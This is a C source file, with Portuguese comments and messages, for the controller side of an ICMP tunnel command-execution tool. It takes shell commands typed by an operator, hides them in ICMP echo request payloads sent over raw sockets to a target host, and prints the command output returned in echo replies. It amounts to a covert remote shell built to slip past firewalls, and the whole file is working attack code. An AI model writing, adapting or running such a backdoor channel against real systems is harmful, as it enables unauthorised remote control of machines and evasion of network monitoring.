#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/time.h>
#include <arpa/inet.h>
#include <netinet/ip.h>
#include <netinet/ip_icmp.h>
#include <netdb.h>

#define MAXTIME 5
#define BUFSIZE 1024

unsigned short checksum(void *b, int len);
char *getip(char *target);
int setsocktimeout(int socket);

int main(int argc , char *argv[])
{
	int bytesent , bytesrecv , errcode , packetsize , sock;
	char command[BUFSIZE] , icmpreply[BUFSIZE] , *payload , *ip, *packet , *data;

	struct icmphdr *icmpheader, *icmpreply_header;
	struct iphdr *ipheader;
	struct sockaddr_in dst_addr , src_addr;

	if(argc != 2)
	{
		printf("Use: %s [ALVO].\n",argv[0]);
		return EXIT_SUCCESS;
	}
	else if(getuid() != 0)
	{
		fprintf(stderr , "[INFO] Permissão negada !\nO programa deve ser executado como root.\n");
        return EXIT_FAILURE;
	}
 
 	ip = getip(argv[1]);
	if(ip == NULL)
	{
		fprintf(stderr , "[ERRO] Getip: não foi possivel resolver o endereço de destino\n%s",argv[1]);
		return EXIT_FAILURE;
	}

	sock = socket(AF_INET , SOCK_RAW , IPPROTO_ICMP);
	if(sock == -1)
	{
		perror("[ERRO] Socket");
		return EXIT_FAILURE;
	}

	errcode = setsocktimeout(sock);
	if(errcode != 0) 
	{
		fprintf(stderr , "[ERRO] Setsocktimeout: %s\n", strerror(errcode));
		return EXIT_FAILURE;
	}

	// Destino do pacote
	dst_addr.sin_family = AF_INET;
	dst_addr.sin_addr.s_addr = inet_addr(ip);

	for(int seq = 1;;++seq)
	{
		bytesent = bytesrecv = packetsize = 0;

		printf("┌──(ICMP EXEC/Mestre -> %s)\n",ip);
		printf("└─# "), fgets(command , sizeof(command) , stdin);

		packetsize = sizeof(struct icmphdr) + strlen(command) + 1;
		packet = (char *)calloc(sizeof(char) , packetsize);

		icmpheader = (struct icmphdr *)packet;
		data = packet + sizeof(struct icmphdr);

		icmpheader->type = ICMP_ECHO;
		icmpheader->code = 0;
		icmpheader->un.echo.id = getpid();
		icmpheader->un.echo.sequence = seq;

		memcpy(data, command , strlen(command));
		icmpheader->checksum = checksum(packet, packetsize);

		// Envia um echo request para o destino com o comando
		bytesent = sendto(sock , packet ,packetsize, 0 , (struct sockaddr *)&dst_addr , sizeof(dst_addr));
		if(bytesent <= 0) perror("[ERRO] Sendto");

		// Obtendo a resposta com a saida do comando
		while((bytesrecv = recv(sock , icmpreply , sizeof(icmpreply) , 0)) > 0)
		{
        	if(bytesrecv > 0)
        	{
            	ipheader = (struct iphdr *)icmpreply;
            	src_addr.sin_addr.s_addr = ipheader->saddr;
            	icmpreply_header = (struct icmphdr *)(ipheader + 1);

           	 	if(bytesrecv > sizeof(struct iphdr) && src_addr.sin_addr.s_addr == dst_addr.sin_addr.s_addr &&
           	 		icmpreply_header->type == ICMP_ECHOREPLY)
            	{
                	bytesrecv = (bytesrecv - sizeof(struct iphdr)) - sizeof(struct icmphdr); 
                	payload = (char *)(icmpreply + sizeof(struct iphdr) + sizeof(struct icmphdr));
                	payload[bytesrecv] = '\0';
                	printf("%s", payload);
            	}           
         
        	}
        	else perror("[ERRO] Recv");
        	
        	memset(icmpreply, 0 , sizeof(icmpreply));
        }
	}

	close(sock);
	return EXIT_SUCCESS;
}

// Calcula o checksum do cabeçalho ICMP
unsigned short checksum(void *b, int len) 
{    
	unsigned short *buf = b; 
    unsigned int sum = 0; 
    unsigned short result; 
  
    for( sum = 0; len > 1; len -= 2 ) sum += *buf++; 
    
    if ( len == 1 ) sum += *(unsigned char*)buf; 
    sum = (sum >> 16) + (sum & 0xFFFF); 
    sum += (sum >> 16); 
    result = ~sum; 
    
    return result; 
}

// Retorna o IP do destino
char *getip(char *target)
{
	struct hostent *host;
	host = gethostbyname(target);
	if(host == NULL) return NULL;

	return inet_ntoa(*((struct in_addr*)host->h_addr));
}

// Configura o limite de tempo do socket para cada leitura de pacotes.
int setsocktimeout(int socket)
{
	struct timeval timeout;

	timeout.tv_sec = MAXTIME;
	timeout.tv_usec = 0;

	// Setando timeout para a leitura dos pacotes
	if((setsockopt(socket , SOL_SOCKET , SO_RCVTIMEO , (const char*)&timeout , sizeof(timeout))) < 0) return errno;

	return 0;
}